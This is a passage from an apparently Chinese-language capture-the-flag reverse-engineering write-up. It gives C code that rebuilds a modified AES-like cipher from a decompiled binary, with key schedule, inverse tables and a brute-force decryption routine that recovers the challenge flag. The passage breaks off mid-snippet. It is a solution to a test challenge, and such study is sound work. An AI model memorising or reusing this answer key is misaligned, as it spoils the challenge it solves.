RijnDael_AES_LONG_inv_406120[BYTE0(v9)]; //运行到这里，v12, v14, v16, v18的数据应该如下 // 0xe82b2381 v12 // 0x70ea91de v14 // 0xe7e1d2f1 v16 // 0xdb36973b v18 _enc_flag[3] = v18 ^ key[key_index]; key_index += 1; _enc_flag[2] = v16 ^ key[key_index]; key_index += 1; _enc_flag[1] = v14 ^ key[key_index]; key_index += 1; _enc_flag[0] = v12 ^ key[key_index]; for (int i = 0; i &lt; 4; i++) &#123; printf(&quot;%#X, &quot;, _enc_flag[i]); &#125; return 0;&#125; 写解密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#include &lt;stdio.h&gt;#include &lt;windows.h&gt;size_t count = 0;DWORD key[60] = &#123; 0xc3bb95b, 0x578c9d63, 0x7faca21c, 0x29522e93, 0xb268681, 0xda705e01, 0xa7732a53, 0x72e0c013, 0x4b4fcf3b, 0xe46963a6, 0x3eeea9d2, 0xefb38fbb, 0xd156d880, 0x7d037452, 0xd593ea40, 0xd5223126, 0xaf26ac9d, 0xda87ca74, 0xd15d2669, 0x6cadaad, 0xac55acd2, 0xa8909e12, 0xb1db66, 0xcc4c1870, 0x75a166e9, 0xbdaec1d, 0xd797fcc4, 0x9cd3659b, 0x4c532c0, 0xa8214574, 0xccfdc316, 0x6019b4a2, 0x7e7b8af4, 0xdc4d10d9, 0x4b44995f, 0x2ca5c858, 0xace477b4, 0x64dc8662, 0xace477b4, 0xbbc35df5, 0xa2369a2d, 0x97098986, 0x67e15107, 0xfd0b6e21, 0xc838f1d6, 0xc838f1d6, 0x17272a41, 0x38f9ff4a, 0x353f13ab, 0xf0e8d881, 0x9aea3f26, 0x5f3df40c, 0x0, 0xdf1fdb97, 0x2fded50b, 0x49b04218, 0xf3000000, 0xc3fa1e0f, 0xf3000000, 0x841f &#125;;DWORD dword_405420[256] = &#123; 0xa7f45150, 0x65417e53, 0xa4171ac3, 0x5e273a96, 0x6bab3bcb, 0x459d1ff1, 0x58faacab, 0x3e34b93, 0xfa302055, 0x6d76adf6, 0x76cc8891, 0x4c02f525, 0xd7e54ffc, 0xcb2ac5d7, 0x44352680, 0xa362b58f, 0x5ab1de49, 0x1bba2567, 0xeea4598, 0xc0fe5de1, 0x752fc302, 0xf04c8112, 0x97468da3, 0xf9d36bc6, 0x5f8f03e7, 0x9c921595, 0x7a6dbfeb, 0x595295da, 0x83bed42d, 0x217458d3, 0x69e04929, 0xc8c98e44, 0x89c2756a, 0x798ef478, 0x3e58996b, 0x71b927dd, 0x4fe1beb6, 0xad88f017, 0xac20c966, 0x3ace7db4, 0x4adf6318, 0x311ae582, 0x33519760, 0x7f536245, 0x7764b1e0, 0xae6bbb84, 0xa081fe1c, 0x2b08f994, 0x68487058, 0xfd458f19, 0x6cde9487, 0xf87b52b7, 0xd373ab23, 0x24b72e2, 0x8f1fe357, 0xab55662a, 0x28ebb207, 0xc2b52f03, 0x7bc5869a, 0x837d3a5, 0x872830f2, 0xa5bf23b2, 0x6a0302ba, 0x8216ed5c, 0x1ccf8a2b, 0xb479a792, 0xf207f3f0, 0xe2694ea1, 0xf4da65cd, 0xbe0506d5, 0x6234d11f, 0xfea6c48a, 0x532e349d, 0x55f3a2a0, 0xe18a0532, 0xebf6a475, 0xec830b39, 0xef6040aa, 0x9f715e06, 0x106ebd51, 0x8a213ef9, 0x6dd963d, 0x53eddae, 0xbde64d46, 0x8d5491b5, 0x5dc47105, 0xd406046f, 0x155060ff, 0xfb981924, 0xe9bdd697, 0x434089cc, 0x9ed96777, 0x42e8b0bd, 0x8b890788, 0x5b19e738, 0xeec879db, 0xa7ca147, 0xf427ce9, 0x1e84f8c9, 0x0, 0x86800983, 0xed2b3248, 0x70111eac, 0x725a6c4e, 0xff0efdfb, 0x38850f56, 0xd5ae3d1e, 0x392d3627, 0xd90f0a64, 0xa65c6821, 0x545b9bd1, 0x2e36243a, 0x670a0cb1, 0xe757930f, 0x96eeb4d2, 0x919b1b9e, 0xc5c0804f, 0x20dc61a2, 0x4b775a69, 0x1a121c16, 0xba93e20a, 0x2aa0c0e5, 0xe0223c43, 0x171b121d, 0xd090e0b, 0xc78bf2ad, 0xa8b62db9, 0xa91e14c8, 0x19f15785, 0x775af4c, 0xdd99eebb, 0x607fa3fd, 0x2601f79f, 0xf5725cbc, 0x3b6644c5, 0x7efb5b34, 0x29438b76, 0xc623cbdc, 0xfcedb668, 0xf1e4b863, 0xdc31d7ca, 0x85634210, 0x22971340, 0x11c68420, 0x244a857d, 0x3dbbd2f8, 0x32f9ae11, 0xa129c76d, 0x2f9e1d4b, 0x30b2dcf3, 0x52860dec, 0xe3c177d0, 0x16b32b6c, 0xb970a999, 0x489411fa, 0x64e94722, 0x8cfca8c4, 0x3ff0a01a, 0x2c7d56d8, 0x903322ef, 0x4e4987c7, 0xd138d9c1, 0xa2ca8cfe, 0xbd49836, 0x81f5a6cf, 0xde7aa528, 0x8eb7da26, 0xbfad3fa4, 0x9d3a2ce4, 0x9278500d, 0xcc5f6a9b, 0x467e5462, 0x138df6c2, 0xb8d890e8, 0xf7392e5e, 0xafc382f5, 0x805d9fbe, 0x93d0697c, 0x2dd56fa9, 0x1225cfb3, 0x99acc83b, 0x7d1810a7, 0x639ce86e, 0xbb3bdb7b, 0x7826cd09, 0x18596ef4, 0xb79aec01, 0x9a4f83a8, 0x6e95e665, 0xe6ffaa7e, 0xcfbc2108, 0xe815efe6, 0x9be7bad9, 0x366f4ace, 0x99fead4, 0x7cb029d6, 0xb2a431af, 0x233f2a31, 0x94a5c630, 0x66a235c0, 0xbc4e7437, 0xca82fca6, 0xd090e0b0, 0xd8a73315, 0x9804f14a, 0xdaec41f7, 0x50cd7f0e, 0xf691172f, 0xd64d768d, 0xb0ef434d, 0x4daacc54, 0x496e4df, 0xb5d19ee3, 0x886a4c1b, 0x1f2cc1b8, 0x5165467f, 0xea5e9d04, 0x358c015d, 0x7487fa73, 0x410bfb2e, 0x1d67b35a, 0xd2db9252, 0x5610e933, 0x47d66d13, 0x61d79a8c, 0xca1377a, 0x14f8598e, 0x3c13eb89, 0x27a9ceee, 0xc961b735, 0xe51ce1ed, 0xb1477a3c, 0xdfd29c59, 0x73f2553f, 0xce141879, 0x37c773bf, 0xcdf753ea, 0xaafd5f5b, 0x6f3ddf14, 0xdb447886, 0xf3afca81, 0xc468b93e, 0x3424382c, 0x40a3c25f, 0xc31d1672, 0x25e2bc0c, 0x493c288b, 0x950dff41, 0x1a83971, 0xb30c08de, 0xe4b4d89c, 0xc1566490, 0x84cb7b61, 0xb632d570, 0x5c6c4874, 0x57b8d042 &#125;;DWORD dword_405820[256] = &#123; 0xf45150a7, 0x417e5365, 0x171ac3a4, 0x273a965e, 0xab3bcb6b, 0x9d1ff145, 0xfaacab58, 0xe34b9303, 0x302055fa, 0x76adf66d, 0xcc889176, 0x2f5254c, 0xe54ffcd7, 0x2ac5d7cb, 0x35268044, 0x62b58fa3, 0xb1de495a, 0xba25671b, 0xea45980e, 0xfe5de1c0, 0x2fc30275, 0x4c8112f0, 0x468da397, 0xd36bc6f9, 0x8f03e75f, 0x9215959c, 0x6dbfeb7a, 0x5295da59, 0xbed42d83, 0x7458d321, 0xe0492969, 0xc98e44c8, 0xc2756a89, 0x8ef47879, 0x58996b3e, 0xb927dd71, 0xe1beb64f, 0x88f017ad, 0x20c966ac, 0xce7db43a, 0xdf63184a, 0x1ae58231, 0x51976033, 0x5362457f, 0x64b1e077, 0x6bbb84ae, 0x81fe1ca0, 0x8f9942b, 0x48705868, 0x458f19fd, 0xde94876c, 0x7b52b7f8, 0x73ab23d3, 0x4b72e202, 0x1fe3578f, 0x55662aab, 0xebb20728, 0xb52f03c2, 0xc5869a7b, 0x37d3a508, 0x2830f287, 0xbf23b2a5, 0x302ba6a, 0x16ed5c82, 0xcf8a2b1c, 0x79a792b4, 0x7f3f0f2, 0x694ea1e2, 0xda65cdf4, 0x506d5be, 0x34d11f62, 0xa6c48afe, 0x2e349d53, 0xf3a2a055, 0x8a0532e1, 0xf6a475eb, 0x830b39ec, 0x6040aaef, 0x715e069f, 0x6ebd5110, 0x213ef98a, 0xdd963d06, 0x3eddae05, 0xe64d46bd, 0x5491b58d, 0xc471055d, 0x6046fd4, 0x5060ff15, 0x981924fb, 0xbdd697e9, 0x4089cc43, 0xd967779e, 0xe8b0bd42, 0x8907888b, 0x19e7385b, 0xc879dbee, 0x7ca1470a, 0x427ce90f, 0x84f8c91e, 0x0, 0x80098386, 0x2b3248ed, 0x111eac70, 0x5a6c4e72, 0xefdfbff, 0x850f5638, 0xae3d1ed5, 0x2d362739, 0xf0a64d9, 0x5c6821a6, 0x5b9bd154, 0x36243a2e, 0xa0cb167, 0x57930fe7, 0xeeb4d296, 0x9b1b9e91, 0xc0804fc5, 0xdc61a220, 0x775a694b, 0x121c161a, 0x93e20aba, 0xa0c0e52a, 0x223c43e0, 0x1b121d17, 0x90e0b0d, 0x8bf2adc7, 0xb62db9a8, 0x1e14c8a9, 0xf1578519, 0x75af4c07, 0x99eebbdd, 0x7fa3fd60, 0x1f79f26, 0x725cbcf5, 0x6644c53b, 0xfb5b347e, 0x438b7629, 0x23cbdcc6, 0xedb668fc, 0xe4b863f1, 0x31d7cadc, 0x63421085, 0x97134022, 0xc6842011, 0x4a857d24, 0xbbd2f83d, 0xf9ae1132, 0x29c76da1, 0x9e1d4b2f, 0xb2dcf330, 0x860dec52, 0xc177d0e3, 0xb32b6c16, 0x70a999b9, 0x9411fa48, 0xe9472264, 0xfca8c48c, 0xf0a01a3f, 0x7d56d82c, 0x3322ef90, 0x4987c74e, 0x38d9c1d1, 0xca8cfea2, 0xd498360b, 0xf5a6cf81, 0x7aa528de, 0xb7da268e, 0xad3fa4bf, 0x3a2ce49d, 0x78500d92, 0x5f6a9bcc, 0x7e546246, 0x8df6c213, 0xd890e8b8, 0x392e5ef7, 0xc382f5af, 0x5d9fbe80, 0xd0697c93, 0xd56fa92d, 0x25cfb312, 0xacc83b99, 0x1810a77d, 0x9ce86e63, 0x3bdb7bbb, 0x26cd0978, 0x596ef418, 0x9aec01b7, 0x4f83a89a, 0x95e6656e, 0xffaa7ee6, 0xbc2108cf, 0x15efe6e8, 0xe7bad99b, 0x6f4ace36, 0x9fead409, 0xb029d67c, 0xa431afb2, 0x3f2a3123, 0xa5c63094, 0xa235c066, 0x4e7437bc, 0x82fca6ca, 0x90e0b0d0, 0xa73315d8, 0x4f14a98, 0xec41f7da, 0xcd7f0e50, 0x91172ff6, 0x4d768dd6, 0xef434db0, 0xaacc544d, 0x96e4df04, 0xd19ee3b5, 0x6a4c1b88, 0x2cc1b81f, 0x65467f51, 0x5e9d04ea, 0x8c015d35, 0x87fa7374, 0xbfb2e41, 0x67b35a1d, 0xdb9252d2, 0x10e93356, 0xd66d1347, 0xd79a8c61, 0xa1377a0c, 0xf8598e14, 0x13eb893c, 0xa9ceee27, 0x61b735c9, 0x1ce1ede5, 0x477a3cb1, 0xd29c59df, 0xf2553f73, 0x141879ce, 0xc773bf37, 0xf753eacd, 0xfd5f5baa, 0x3ddf146f, 0x447886db, 0xafca81f3, 0x68b93ec4, 0x24382c34, 0xa3c25f40, 0x1d1672c3, 0xe2bc0c25, 0x3c288b49, 0xdff4195, 0xa8397101, 0xc08deb3, 0xb4d89ce4, 0x566490c1, 0xcb7b6184, 0x32d570b6, 0x6c48745c, 0xb8d04257 &#125;;DWORD dword_405C20[256] = &#123; 0x5150a7f4, 0x7e536541, 0x1ac3a417, 0x3a965e27, 0x3bcb6bab, 0x1ff1459d, 0xacab58fa, 0x4b9303e3, 0x2055fa30, 0xadf66d76, 0x889176cc, 0xf5254c02, 0x4ffcd7e5, 0xc5d7cb2a, 0x26804435, 0xb58fa362, 0xde495ab1, 0x25671bba, 0x45980eea, 0x5de1c0fe, 0xc302752f, 0x8112f04c, 0x8da39746, 0x6bc6f9d3, 0x3e75f8f, 0x15959c92, 0xbfeb7a6d, 0x95da5952, 0xd42d83be, 0x58d32174, 0x492969e0, 0x8e44c8c9, 0x756a89c2, 0xf478798e, 0x996b3e58, 0x27dd71b9, 0xbeb64fe1, 0xf017ad88, 0xc966ac20, 0x7db43ace, 0x63184adf, 0xe582311a, 0x97603351, 0x62457f53, 0xb1e07764, 0xbb84ae6b, 0xfe1ca081, 0xf9942b08, 0x70586848, 0x8f19fd45, 0x94876cde, 0x52b7f87b, 0xab23d373, 0x72e2024b, 0xe3578f1f, 0x662aab55, 0xb20728eb, 0x2f03c2b5, 0x869a7bc5, 0xd3a50837, 0x30f28728, 0x23b2a5bf, 0x2ba6a03, 0xed5c8216, 0x8a2b1ccf, 0xa792b479, 0xf3f0f207, 0x4ea1e269, 0x65cdf4da, 0x6d5be05, 0xd11f6234, 0xc48afea6, 0x349d532e, 0xa2a055f3, 0x532e18a, 0xa475ebf6, 0xb39ec83, 0x40aaef60, 0x5e069f71, 0xbd51106e, 0x3ef98a21, 0x963d06dd, 0xddae053e, 0x4d46bde6, 0x91b58d54, 0x71055dc4, 0x46fd406, 0x60ff1550, 0x1924fb98, 0xd697e9bd, 0x89cc4340, 0x67779ed9, 0xb0bd42e8, 0x7888b89, 0xe7385b19, 0x79dbeec8, 0xa1470a7c, 0x7ce90f42, 0xf8c91e84, 0x0, 0x9838680, 0x3248ed2b, 0x1eac7011, 0x6c4e725a, 0xfdfbff0e, 0xf563885, 0x3d1ed5ae, 0x3627392d, 0xa64d90f, 0x6821a65c, 0x9bd1545b, 0x243a2e36, 0xcb1670a, 0x930fe757, 0xb4d296ee, 0x1b9e919b, 0x804fc5c0, 0x61a220dc, 0x5a694b77, 0x1c161a12, 0xe20aba93, 0xc0e52aa0, 0x3c43e022, 0x121d171b, 0xe0b0d09, 0xf2adc78b, 0x2db9a8b6, 0x14c8a91e, 0x578519f1, 0xaf4c0775, 0xeebbdd99, 0xa3fd607f, 0xf79f2601, 0x5cbcf572, 0x44c53b66, 0x5b347efb, 0x8b762943, 0xcbdcc623, 0xb668fced, 0xb863f1e4, 0xd7cadc31, 0x42108563, 0x13402297, 0x842011c6, 0x857d244a, 0xd2f83dbb, 0xae1132f9, 0xc76da129, 0x1d4b2f9e, 0xdcf330b2, 0xdec5286, 0x77d0e3c1, 0x2b6c16b3, 0xa999b970, 0x11fa4894, 0x472264e9, 0xa8c48cfc, 0xa01a3ff0, 0x56d82c7d, 0x22ef9033, 0x87c74e49, 0xd9c1d138, 0x8cfea2ca, 0x98360bd4, 0xa6cf81f5, 0xa528de7a, 0xda268eb7, 0x3fa4bfad, 0x2ce49d3a, 0x500d9278, 0x6a9bcc5f, 0x5462467e, 0xf6c2138d, 0x90e8b8d8, 0x2e5ef739, 0x82f5afc3, 0x9fbe805d, 0x697c93d0, 0x6fa92dd5, 0xcfb31225, 0xc83b99ac, 0x10a77d18, 0xe86e639c, 0xdb7bbb3b, 0xcd097826, 0x6ef41859, 0xec01b79a, 0x83a89a4f, 0xe6656e95, 0xaa7ee6ff, 0x2108cfbc, 0xefe6e815, 0xbad99be7, 0x4ace366f, 0xead4099f, 0x29d67cb0, 0x31afb2a4, 0x2a31233f, 0xc63094a5, 0x35c066a2, 0x7437bc4e, 0xfca6ca82, 0xe0b0d090, 0x3315d8a7, 0xf14a9804, 0x41f7daec, 0x7f0e50cd, 0x172ff691, 0x768dd64d, 0x434db0ef, 0xcc544daa, 0xe4df0496, 0x9ee3b5d1, 0x4c1b886a, 0xc1b81f2c, 0x467f5165, 0x9d04ea5e, 0x15d358c, 0xfa737487, 0xfb2e410b, 0xb35a1d67, 0x9252d2db, 0xe9335610, 0x6d1347d6, 0x9a8c61d7, 0x377a0ca1, 0x598e14f8, 0xeb893c13, 0xceee27a9, 0xb735c961, 0xe1ede51c, 0x7a3cb147, 0x9c59dfd2, 0x553f73f2, 0x1879ce14, 0x73bf37c7, 0x53eacdf7, 0x5f5baafd, 0xdf146f3d, 0x7886db44, 0xca81f3af, 0xb93ec468, 0x382c3424, 0xc25f40a3, 0x1672c31d, 0xbc0c25e2, 0x288b493c, 0xff41950d, 0x397101a8, 0x8deb30c, 0xd89ce4b4, 0x6490c156, 0x7b6184cb, 0xd570b632, 0x48745c6c, 0xd04257b8 &#125;;DWORD dword_405020[256] = &#123; 0x50a7f451, 0x5365417e, 0xc3a4171a, 0x965e273a, 0xcb6bab3b, 0xf1459d1f, 0xab58faac, 0x9303e34b, 0x55fa3020, 0xf66d76ad, 0x9176cc88, 0x254c02f5, 0xfcd7e54f, 0xd7cb2ac5, 0x80443526, 0x8fa362b5, 0x495ab1de, 0x671bba25, 0x980eea45, 0xe1c0fe5d, 0x2752fc3, 0x12f04c81, 0xa397468d, 0xc6f9d36b, 0xe75f8f03, 0x959c9215, 0xeb7a6dbf, 0xda595295, 0x2d83bed4, 0xd3217458, 0x2969e049, 0x44c8c98e, 0x6a89c275, 0x78798ef4, 0x6b3e5899, 0xdd71b927, 0xb64fe1be, 0x17ad88f0, 0x66ac20c9, 0xb43ace7d, 0x184adf63, 0x82311ae5, 0x60335197, 0x457f5362, 0xe07764b1, 0x84ae6bbb, 0x1ca081fe, 0x942b08f9, 0x58684870, 0x19fd458f, 0x876cde94, 0xb7f87b52, 0x23d373ab, 0xe2024b72, 0x578f1fe3, 0x2aab5566, 0x728ebb2, 0x3c2b52f, 0x9a7bc586, 0xa50837d3, 0xf2872830, 0xb2a5bf23, 0xba6a0302, 0x5c8216ed, 0x2b1ccf8a, 0x92b479a7, 0xf0f207f3, 0xa1e2694e, 0xcdf4da65, 0xd5be0506, 0x1f6234d1, 0x8afea6c4, 0x9d532e34, 0xa055f3a2, 0x32e18a05, 0x75ebf6a4, 0x39ec830b, 0xaaef6040, 0x69f715e, 0x51106ebd, 0xf98a213e, 0x3d06dd96, 0xae053edd, 0x46bde64d, 0xb58d5491, 0x55dc471, 0x6fd40604, 0xff155060, 0x24fb9819, 0x97e9bdd6, 0xcc434089, 0x779ed967, 0xbd42e8b0, 0x888b8907, 0x385b19e7, 0xdbeec879, 0x470a7ca1, 0xe90f427c, 0xc91e84f8, 0x0, 0x83868009, 0x48ed2b32, 0xac70111e, 0x4e725a6c, 0xfbff0efd, 0x5638850f, 0x1ed5ae3d, 0x27392d36, 0x64d90f0a, 0x21a65c68, 0xd1545b9b, 0x3a2e3624, 0xb1670a0c, 0xfe75793, 0xd296eeb4, 0x9e919b1b, 0x4fc5c080, 0xa220dc61, 0x694b775a, 0x161a121c, 0xaba93e2, 0xe52aa0c0, 0x43e0223c, 0x1d171b12, 0xb0d090e, 0xadc78bf2, 0xb9a8b62d, 0xc8a91e14, 0x8519f157, 0x4c0775af, 0xbbdd99ee, 0xfd607fa3, 0x9f2601f7, 0xbcf5725c, 0xc53b6644, 0x347efb5b, 0x7629438b, 0xdcc623cb, 0x68fcedb6, 0x63f1e4b8, 0xcadc31d7, 0x10856342, 0x40229713, 0x2011c684, 0x7d244a85, 0xf83dbbd2, 0x1132f9ae, 0x6da129c7, 0x4b2f9e1d, 0xf330b2dc, 0xec52860d, 0xd0e3c177, 0x6c16b32b, 0x99b970a9, 0xfa489411, 0x2264e947, 0xc48cfca8, 0x1a3ff0a0, 0xd82c7d56, 0xef903322, 0xc74e4987, 0xc1d138d9, 0xfea2ca8c, 0x360bd498, 0xcf81f5a6, 0x28de7aa5, 0x268eb7da, 0xa4bfad3f, 0xe49d3a2c, 0xd927850, 0x9bcc5f6a, 0x62467e54, 0xc2138df6, 0xe8b8d890, 0x5ef7392e, 0xf5afc382, 0xbe805d9f, 0x7c93d069, 0xa92dd56f, 0xb31225cf, 0x3b99acc8, 0xa77d1810, 0x6e639ce8, 0x7bbb3bdb, 0x97826cd, 0xf418596e, 0x1b79aec, 0xa89a4f83, 0x656e95e6, 0x7ee6ffaa, 0x8cfbc21, 0xe6e815ef, 0xd99be7ba, 0xce366f4a, 0xd4099fea, 0xd67cb029, 0xafb2a431, 0x31233f2a, 0x3094a5c6, 0xc066a235, 0x37bc4e74, 0xa6ca82fc, 0xb0d090e0, 0x15d8a733, 0x4a9804f1, 0xf7daec41, 0xe50cd7f, 0x2ff69117, 0x8dd64d76, 0x4db0ef43, 0x544daacc, 0xdf0496e4, 0xe3b5d19e, 0x1b886a4c, 0xb81f2cc1, 0x7f516546, 0x4ea5e9d, 0x5d358c01, 0x737487fa, 0x2e410bfb, 0x5a1d67b3, 0x52d2db92, 0x335610e9, 0x1347d66d, 0x8c61d79a, 0x7a0ca137, 0x8e14f859, 0x893c13eb, 0xee27a9ce, 0x35c961b7, 0xede51ce1, 0x3cb1477a, 0x59dfd29c, 0x3f73f255, 0x79ce1418, 0xbf37c773, 0xeacdf753, 0x5baafd5f, 0x146f3ddf, 0x86db4478, 0x81f3afca, 0x3ec468b9, 0x2c342438, 0x5f40a3c2, 0x72c31d16, 0xc25e2bc, 0x8b493c28, 0x41950dff, 0x7101a839, 0xdeb30c08, 0x9ce4b4d8, 0x90c15664, 0x6184cb7b, 0x70b632d5, 0x745c6c48, 0x4257b8d0 &#125;;BYTE RijnDael_AES_LONG_inv_406120[256] = &#123; 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D &#125;;BYTE BYTE1(DWORD _data)&#123; return (_data &gt;&gt; 8) &amp; 0XFF;&#125;BYTE BYTE2(DWORD _data)&#123; return (_data &gt;&gt; 16) &amp; 0XFF;&#125;BYTE BYTE3(DWORD _data)&#123; return (_data &gt;&gt; 24) &amp; 0XFF;&#125;BYTE BYTE0(DWORD _data)&#123; return _data &amp; 0XFF;&#125;// void brute(DWORD target /*, unsigned char *a1, unsigned char *a2, unsigned char *a3, unsigned char *a4*/)// &#123;// for (unsigned char i1 = 0; i1 &lt; 256; i1++)// &#123;// for (unsigned char i2 = 0; i2 &lt; 256; i2++)// &#123;// for (unsigned char i3 = 0; i3 &lt; 256; i3++)// &#123;// for (unsigned char i4 = 0; i4 &lt; 256; i4++)// &#123;// if ((dword_405020[i1] ^ dword_405420[i2] ^ dword_405820[i3] ^ dword_405C20[i4]) == target)// &#123;// printf(&quot;brute found for %#x: %d %d %d %d\\n&quot;, target, i1, i2, i3, i4);// // *a1 = i1;// // *a2 = i2;// // *a3 = i3;// // *a4 = i4;// return;// &#125;// &#125;// &#125;// &#125;// &#125;// &#125;void brute(DWORD target, unsigned char* a1, unsigned char* a2, unsigned char* a3, unsigned char* a4)&#123; for (size_t i1 = 0; i1 &lt; 256; i1++) &#123; for (size_t i2 = 0; i2 &lt; 256; i2++) &#123; for (size_t i3 = 0; i3 &lt; 256; i3++) &#123; for (size_t i4 = 0; i4 &lt; 256; i4++) &#123; if ((dword_405420[i1] ^ dword_405820[i2] ^ dword_405C20[i3] ^ dword_405020[i4]) == target) &#123; printf(&quot;%d - brute found for %x:%d %d %d %d\\n&quot;, count++, target, i1, i2, i3, i4); *a1 = i1; *a2 = i2; *a3 = i3; *a4 = i4; &#125; &#125; &#125; &#125; &#125;&#125;unsigned char findIndex1(BYTE data)&#123; BYTE* array = RijnDael_AES_LONG_inv_406120; for (unsigned char i = 0; i &lt; 256; i++) &#123; if (array[i] == data) return i; &#125; return -1;&#125;void decrypt(DWORD* miwen, DWORD* flag)&#123; int key_index = 59; DWORD v12, v14, v16, v18; DWORD v11, v13, v15, v17; unsigned char _v9[4] = &#123; 0 &#125;; unsigned char _v8[4] = &#123; 0 &#125;; unsigned char _v7[4] = &#123; 0 &#125;; unsigned char _i[4] = &#123; 0 &#125;; DWORD v9, v8, v7, i; v12 = miwen[0] ^ key[key_index--]; v14 = miwen[1] ^ key[key_index--]; v16 = miwen[2] ^ key[key_index--]; v18 = miwen[3] ^ key[key_index--]; // 得到v9, v8, v7, i; _i[0] = findIndex1(BYTE0(v12)); _v9[1] = findIndex1(BYTE1(v12)); _v8[2] = findIndex1(BYTE2(v12)); _v7[3] = findIndex1(BYTE3(v12)); _v7[0] = findIndex1(BYTE0(v14)); _i[1] = findIndex1(BYTE1(v14)); _v9[2] = findIndex1(BYTE2(v14)); _v8[3] = findIndex1(BYTE3(v14)); _v8[0] = findIndex1(BYTE0(v16)); _v7[1] = findIndex1(BYTE1(v16)); _i[2] = findIndex1(BYTE2(v16)); _v9[3] = findIndex1(BYTE3(v16)); _v9[0] = findIndex1(BYTE0(v18)); _v8[1] = findIndex1(BYTE1(v18)); _v7[2] = findIndex1(BYTE2(v18)); _i[3] = findIndex1(BYTE3(v18)); v9 = *(DWORD*)_v9; v8 = *(DWORD*)_v8; v7 = *(DWORD*)_v7; i = *(DWORD*)_i; // v9 = 0x948726e2; // v8 = 0x51f188a1; // v7 = 0x9b05b51d; // i = 0xb9f8810c; for (int j = 0; j &lt; 13; j++) &#123; v11 = i ^ key[key_index--]; v13 = v7 ^ key[key_index--]; v15 = v8 ^ key[key_index--]; v17 = v9 ^ key[key_index--]; brute(v11, &amp;_v9[1], &amp;_v8[2], &amp;_v7[3], &amp;_i[0]); brute(v13, &amp;_i[1], &amp;_v9[2], &amp;_v8[3], &amp;_v7[0]); brute(v15, &amp;_v7[1], &amp;_i[2], &amp;_v9[3], &amp;_v8[0]); brute(v17, &amp;_v8[1], &amp;_v7[2], &amp;_i[3], &amp;_v9[0]); v9 = *(DWORD*)_v9; v8 = *(DWORD*)_v8; v7 = *(DWORD*)_v7; i = *(DWORD*)_i; &#125; flag[0] = i ^ key[key_index--]; flag[1] = v7 ^ key[key_index--]; flag[2] = v8 ^ key[key_index--]; flag[3] = v9 ^ key[key_index--];&#125;int main()&#123; printf(&quot;Start...\\n&quot;); DWORD cmp_data[8] = &#123; 0xE82BA79E, 0x83EA91DE, 0x241BCCFE, 0x2836973B, 0x5F86C92D, 0x0C8094E88, 0x0FEC81BB0, 0x0D5277623 &#125;; //DWORD cmp_data[8] = &#123;0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6, 0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6&#125;; //拿1234567890123456做测试 DWORD flag[8] = &#123; 0 &#125;; decrypt(cmp_data, flag); decrypt(&amp;cmp_data[4], &amp;flag[4]); printf(&quot;flag: %s\\n\\n&quot;, (char*)flag); char* tmp = (char*)flag; for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%X, &quot;, tmp[i]); &#125; return 0;&#125; 最终跑出来的数据为 稍作处理 123456789101112#include &lt;stdio.h&gt;int main()&#123; unsigned int a[] = &#123;0XFFFFFFF2, 0XFFFFFF88, 0X35, 0X49, 0XFFFFFFF8, 0X5C, 0X2A, 0X4, 0XFFFFFFA8, 0X4E, 0XFFFFFF86, 0XFFFFFF9E, 0XFFFFFFBE, 0XFFFFFFF9, 0X2A, 0XE, 0XFFFFFFC6, 0X4, 0XFFFFFF94, 